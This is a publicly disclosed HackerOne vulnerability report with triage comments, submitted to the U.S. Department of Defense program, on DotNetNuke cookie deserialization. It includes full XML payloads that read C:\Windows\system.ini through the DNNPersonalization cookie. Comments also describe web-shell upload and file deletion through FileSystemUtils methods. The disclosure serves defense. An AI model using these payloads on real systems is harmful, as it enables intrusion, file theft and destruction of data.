{"id":876708,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzY3MDg=","url":"https://hackerone.com/reports/876708","title":"Remote Code Execution through DNN Cookie Deserialization ","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-05-17T20:13:54.706Z","submitted_at":"2020-05-17T20:13:54.706Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"droop3r","url":"/droop3r","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://www.dc3.mil/vulnerability-disclosure","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-05-27T14:06:11.705Z","bug_reporter_agreed_on_going_public_at":"2020-05-26T15:18:31.636Z","team_member_agreed_on_going_public_at":"2020-05-27T14:06:11.636Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nThe application at ```https://████████``` presents a deserialization vulnerability that permits RCE and file read/write\n\n## Step-by-step Reproduction Instructions\n\n1. Navigate to a random page that must return a 404 Error status like ```https://████/test```\n2. Add this cookie in the request header: ```DNNPersonalization```\n3. Insert the payload into the ```DNNPersonalization``` cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:\n\n```\n\u003cprofile\u003e\n\u003citem key=\"name1:key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████\"\u003e\u003cExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\n\u003cExpandedElement/\u003e\n\u003cProjectedProperty0\u003e\n\u003cMethodName\u003eWriteFile\u003c/MethodName\u003e\n\u003cMethodParameters\u003e\n\u003canyType xsi:type=\"xsd:string\"\u003etest\u003c/anyType\u003e\n\u003c/MethodParameters\u003e\n\u003cObjectInstance xsi:type=\"FileSystemUtils\"\u003e\u003c/ObjectInstance\u003e\n\u003c/ProjectedProperty0\u003e\n\u003c/ExpandedWrapperOfFileSystemUtilsObjectDataProvider\u003e\n\u003c/item\u003e\n\u003c/profile\u003e\n```\n\nWhere ```test``` is the wanted file\n\nExpected result:\n████\n\n\n## Product, Version, and Configuration (If applicable)\nPlatform: https://████████/shell.aspx\nVulnerable Product: DotNetNuke\nVulnerable Version: \u003c 9.3.0-RC\n\n\n## Suggested Mitigation/Remediation Actions\nUpdate the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable\n\n## Impact\n\nAn attacker can execute remote commands on the system and gain unauthorized access to it.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003cbr\u003e\nThe application at \u003ccode\u003ehttps://████████\u003c/code\u003e presents a deserialization vulnerability that permits RCE and file read/write\u003c/p\u003e\n\n\u003ch2 id=\"step-by-step-reproduction-instructions\"\u003eStep-by-step Reproduction Instructions\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eNavigate to a random page that must return a 404 Error status like \u003ccode\u003ehttps://████/test\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eAdd this cookie in the request header: \u003ccode\u003eDNNPersonalization\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eInsert the payload into the \u003ccode\u003eDNNPersonalization\u003c/code\u003e cookie. You can generate a payload with the following tool \u003ca title=\"https://github.com/pwntester/ysoserial.net\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpwntester%2Fysoserial.net\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/pwntester/ysoserial.net\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, using the DotNetNuke plugin, or use the official exploit from here: \u003ca title=\"https://www.exploit-db.com/exploits/48336\" href=\"/redirect?url=https%3A%2F%2Fwww.exploit-db.com%2Fexploits%2F48336\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.exploit-db.com/exploits/48336\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, or use the following payload to read a file from the system:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;profile\u0026gt;\n\u0026lt;item key=\u0026quot;name1:key1\u0026quot; type=\u0026quot;System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████\u0026quot;\u0026gt;\u0026lt;ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\u0026quot;http://www.w3.org/2001/XMLSchema\u0026quot; xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u0026gt;\n\u0026lt;ExpandedElement/\u0026gt;\n\u0026lt;ProjectedProperty0\u0026gt;\n\u0026lt;MethodName\u0026gt;WriteFile\u0026lt;/MethodName\u0026gt;\n\u0026lt;MethodParameters\u0026gt;\n\u0026lt;anyType xsi:type=\u0026quot;xsd:string\u0026quot;\u0026gt;test\u0026lt;/anyType\u0026gt;\n\u0026lt;/MethodParameters\u0026gt;\n\u0026lt;ObjectInstance xsi:type=\u0026quot;FileSystemUtils\u0026quot;\u0026gt;\u0026lt;/ObjectInstance\u0026gt;\n\u0026lt;/ProjectedProperty0\u0026gt;\n\u0026lt;/ExpandedWrapperOfFileSystemUtilsObjectDataProvider\u0026gt;\n\u0026lt;/item\u0026gt;\n\u0026lt;/profile\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhere \u003ccode\u003etest\u003c/code\u003e is the wanted file\u003c/p\u003e\n\n\u003cp\u003eExpected result:\u003cbr\u003e\n████\u003c/p\u003e\n\n\u003ch2 id=\"product-version-and-configuration-if-applicable\"\u003eProduct, Version, and Configuration (If applicable)\u003c/h2\u003e\n\n\u003cp\u003ePlatform: https://████████/shell.aspx\u003cbr\u003e\nVulnerable Product: DotNetNuke\u003cbr\u003e\nVulnerable Version: \u0026lt; 9.3.0-RC\u003c/p\u003e\n\n\u003ch2 id=\"suggested-mitigation-remediation-actions\"\u003eSuggested Mitigation/Remediation Actions\u003c/h2\u003e\n\n\u003cp\u003eUpdate the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can execute remote commands on the system and gain unauthorized access to it.\u003c/p\u003e\n","weakness":{"id":59,"name":"OS Command Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":51,"voters":["nytr0gen","brahim_boufakri01","0xelkomy","droop3r","zeop","xxiad","zamacraig","akhilpanwar","tr1xx0r","anubisthejackle","and 41 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8028582,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","markdown_message":"\u003cp\u003eGreetings from the Department of Defense (DoD),\u003c/p\u003e\n\n\u003cp\u003eThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\u003c/p\u003e\n\n\u003cp\u003eBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at \u003ca href=\"/deptofdefense\"\u003e@DeptofDefense\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\u003c/p\u003e\n\n\u003cp\u003eWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\u003c/p\u003e\n\n\u003cp\u003eOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eThe VDP Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-05-17T20:13:55.311Z","updated_at":"2020-05-17T20:13:55.311Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8035632,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@droop3r can you provide more information on this? .rb doesnt appear to work right off in msfconsole and I did not have any luck w/any of the other tries.\n1. do you have the ysoserial payload?\n2. can you show this actually working by running a command such as whoami or reading a file that is not publicly available (like boot.ini)?\n\nThanks!","markdown_message":"\u003cp\u003e\u003ca href=\"/droop3r\"\u003e@droop3r\u003c/a\u003e can you provide more information on this? .rb doesnt appear to work right off in msfconsole and I did not have any luck w/any of the other tries.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003edo you have the ysoserial payload?\u003c/li\u003e\n\u003cli\u003ecan you show this actually working by running a command such as whoami or reading a file that is not publicly available (like boot.ini)?\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-18T13:39:08.615Z","updated_at":"2020-05-18T13:41:10.004Z","actor":{"username":"agent-l8","cleared":false,"url":"/agent-l8","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8035876,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi,\n\nYou can read, for example the ```C:\\Windows\\system.ini``` file (which is not publicly available) through the following payload:\n\n```\n\u003cprofile\u003e\n\u003citem key=\"name1:key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████\"\u003e\u003cExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\u003e\n\u003cExpandedElement/\u003e\n\u003cProjectedProperty0\u003e\n\u003cMethodName\u003eWriteFile\u003c/MethodName\u003e\n\u003cMethodParameters\u003e\n\u003canyType xsi:type=\"xsd:string\"\u003eC:\\Windows\\system.ini\u003c/anyType\u003e\n\u003c/MethodParameters\u003e\n\u003cObjectInstance xsi:type=\"FileSystemUtils\"\u003e\u003c/ObjectInstance\u003e\n\u003c/ProjectedProperty0\u003e\n\u003c/ExpandedWrapperOfFileSystemUtilsObjectDataProvider\u003e\n\u003c/item\u003e\n\u003c/profile\u003e\n```\n\nAnd here it is the result:\n███████\n","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eYou can read, for example the \u003ccode\u003eC:\\Windows\\system.ini\u003c/code\u003e file (which is not publicly available) through the following payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;profile\u0026gt;\n\u0026lt;item key=\u0026quot;name1:key1\u0026quot; type=\u0026quot;System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████\u0026quot;\u0026gt;\u0026lt;ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\u0026quot;http://www.w3.org/2001/XMLSchema\u0026quot; xmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\u0026gt;\n\u0026lt;ExpandedElement/\u0026gt;\n\u0026lt;ProjectedProperty0\u0026gt;\n\u0026lt;MethodName\u0026gt;WriteFile\u0026lt;/MethodName\u0026gt;\n\u0026lt;MethodParameters\u0026gt;\n\u0026lt;anyType xsi:type=\u0026quot;xsd:string\u0026quot;\u0026gt;C:\\Windows\\system.ini\u0026lt;/anyType\u0026gt;\n\u0026lt;/MethodParameters\u0026gt;\n\u0026lt;ObjectInstance xsi:type=\u0026quot;FileSystemUtils\u0026quot;\u0026gt;\u0026lt;/ObjectInstance\u0026gt;\n\u0026lt;/ProjectedProperty0\u0026gt;\n\u0026lt;/ExpandedWrapperOfFileSystemUtilsObjectDataProvider\u0026gt;\n\u0026lt;/item\u0026gt;\n\u0026lt;/profile\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd here it is the result:\u003cbr\u003e\n███████\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-18T13:52:56.277Z","updated_at":"2020-05-27T13:12:22.528Z","actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8037792,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-18T15:26:27.231Z","updated_at":"2020-05-18T15:26:27.231Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":725311},"actor":{"username":"agent-r5","cleared":false,"url":"/agent-r5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8037794,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","markdown_message":"\u003cp\u003eGreetings,\u003c/p\u003e\n\n\u003cp\u003eWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\u003c/p\u003e\n\n\u003cp\u003eThank you for bringing this vulnerability to our attention!\u003c/p\u003e\n\n\u003cp\u003eWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\u003c/p\u003e\n\n\u003cp\u003eYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\u003c/p\u003e\n\n\u003cp\u003eThanks again for supporting the DoD Vulnerability Disclosure Program.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eThe VDP Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-18T15:26:28.684Z","updated_at":"2020-05-18T15:26:28.684Z","actor":{"username":"agent-r5","cleared":false,"url":"/agent-r5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8037816,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"So far we do not see the RCE just ability to get to file system. If you provide proof of rce (maybe call cmd.exe to run whoami) we will raise severity appropriately. ","markdown_message":"\u003cp\u003eSo far we do not see the RCE just ability to get to file system. If you provide proof of rce (maybe call cmd.exe to run whoami) we will raise severity appropriately. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-18T15:28:30.530Z","updated_at":"2020-05-18T15:28:30.530Z","actor":{"username":"agent-r5","cleared":false,"url":"/agent-r5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8039738,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There is the possibility to write files on the system too, which can result into an ASPX Web Shell upload, but for that you must have knowledge about a complete path with write permissions, like the installation folder of the web application. You can brute force the paths using the file read payloads as it will be reflected through the application if there does not exist or if you do not have enough privileges for it.","markdown_message":"\u003cp\u003eThere is the possibility to write files on the system too, which can result into an ASPX Web Shell upload, but for that you must have knowledge about a complete path with write permissions, like the installation folder of the web application. You can brute force the paths using the file read payloads as it will be reflected through the application if there does not exist or if you do not have enough privileges for it.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-18T17:47:27.402Z","updated_at":"2020-05-18T17:47:27.402Z","actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8066258,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The application throws a 403 error status when trying to parse a RCE payload, that's mostly probable the WAF is triggered when a client is trying to send such payloads using ```ObjectStateFormatter```","markdown_message":"\u003cp\u003eThe application throws a 403 error status when trying to parse a RCE payload, that\u0026#39;s mostly probable the WAF is triggered when a client is trying to send such payloads using \u003ccode\u003eObjectStateFormatter\u003c/code\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-21T06:30:35.624Z","updated_at":"2020-05-21T06:30:35.624Z","actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8081865,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@droop3r \n\nHello,  \n\nWhere you able to retry the following payload ObjectStateFormatter?","markdown_message":"\u003cp\u003e\u003ca href=\"/droop3r\"\u003e@droop3r\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eHello,  \u003c/p\u003e\n\n\u003cp\u003eWhere you able to retry the following payload ObjectStateFormatter?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-22T17:23:35.156Z","updated_at":"2020-05-22T17:23:35.156Z","actor":{"username":"agentt2","cleared":false,"url":"/agentt2","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8091156,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi,\n\nNo, and I am not anymore able to test it as the system seems patched.\n\nThanks,\n██████████","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eNo, and I am not anymore able to test it as the system seems patched.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\n██████████\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-24T13:35:33.020Z","updated_at":"2020-05-27T13:14:02.981Z","actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8091221,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As a recap of the issue, the application was vulnerable to payloads based on only ``DotNetNuke.*`` classes. \n\nThe ``Deserialize`` method belonging to  ``ObjectStateFormatter`` requires a Base64 encoded payload to be parsed through its string argument, which was immediately caught by a Web Application Firewall or some detection mechanism, and it didn't allow the payload to be sent through the ``DNNPersonalization`` cookie.\n\nThe vulnerability was demonstrated by pulling the ``C:\\Windows\\system.ini`` file through the ``WriteFile`` method of the ``DotNetNuke.Common.Utilities.FileSystemUtils`` class. (XML Payload)\n\nBesides reading arbitrary files, an attacker could use other methods of the ``DotNetNuke.Common.Utilities.FileSystemUtils`` class to perform other actions, for example:\n\n- Upload file (requires permissions and full local path), through the ``CreateFileFromString`` method\n- Delete file (requires permissions and full local path), through the ``DeleteFile`` method\n- Delete folders (requires permissions and full local path), through the ``DeleteFolderRecursive`` method\n\nA list full of methods can be found here: https://dnndocs.com/api/DotNetNuke.html , some of them may be or may not be working, as the documentation relates to the latest version, and we are testing against an old version of DNN.\n","markdown_message":"\u003cp\u003eAs a recap of the issue, the application was vulnerable to payloads based on only \u003ccode\u003eDotNetNuke.*\u003c/code\u003e classes. \u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003eDeserialize\u003c/code\u003e method belonging to  \u003ccode\u003eObjectStateFormatter\u003c/code\u003e requires a Base64 encoded payload to be parsed through its string argument, which was immediately caught by a Web Application Firewall or some detection mechanism, and it didn\u0026#39;t allow the payload to be sent through the \u003ccode\u003eDNNPersonalization\u003c/code\u003e cookie.\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability was demonstrated by pulling the \u003ccode\u003eC:\\Windows\\system.ini\u003c/code\u003e file through the \u003ccode\u003eWriteFile\u003c/code\u003e method of the \u003ccode\u003eDotNetNuke.Common.Utilities.FileSystemUtils\u003c/code\u003e class. (XML Payload)\u003c/p\u003e\n\n\u003cp\u003eBesides reading arbitrary files, an attacker could use other methods of the \u003ccode\u003eDotNetNuke.Common.Utilities.FileSystemUtils\u003c/code\u003e class to perform other actions, for example:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eUpload file (requires permissions and full local path), through the \u003ccode\u003eCreateFileFromString\u003c/code\u003e method\u003c/li\u003e\n\u003cli\u003eDelete file (requires permissions and full local path), through the \u003ccode\u003eDeleteFile\u003c/code\u003e method\u003c/li\u003e\n\u003cli\u003eDelete folders (requires permissions and full local path), through the \u003ccode\u003eDeleteFolderRecursive\u003c/code\u003e method\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eA list full of methods can be found here: \u003ca title=\"https://dnndocs.com/api/DotNetNuke.html\" href=\"/redirect?url=https%3A%2F%2Fdnndocs.com%2Fapi%2FDotNetNuke.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://dnndocs.com/api/DotNetNuke.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e , some of them may be or may not be working, as the documentation relates to the latest version, and we are testing against an old version of DNN.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-24T14:03:37.423Z","updated_at":"2020-05-24T14:03:37.423Z","actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8107875,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","markdown_message":"\u003cp\u003eGood news!\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\u003c/p\u003e\n\n\u003cp\u003eThank you for your time and effort to improve the security of the DoD information network.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eThe VDP Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-26T14:53:47.337Z","updated_at":"2020-05-26T14:53:47.337Z","actor":{"username":"agent-r5","cleared":false,"url":"/agent-r5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"droop3r","url":"/droop3r"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8108099,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we please disclose this one?","markdown_message":"\u003cp\u003eCan we please disclose this one?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-26T15:18:31.652Z","updated_at":"2020-05-26T15:18:31.652Z","first_to_agree":true,"actor":{"username":"droop3r","cleared":false,"url":"/droop3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NXyokUaESNi8gKmJqYK5Uam9/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8119424,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-27T14:06:11.656Z","updated_at":"2020-05-27T14:06:11.656Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8119425,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-27T14:06:11.726Z","updated_at":"2020-05-27T14:06:11.726Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is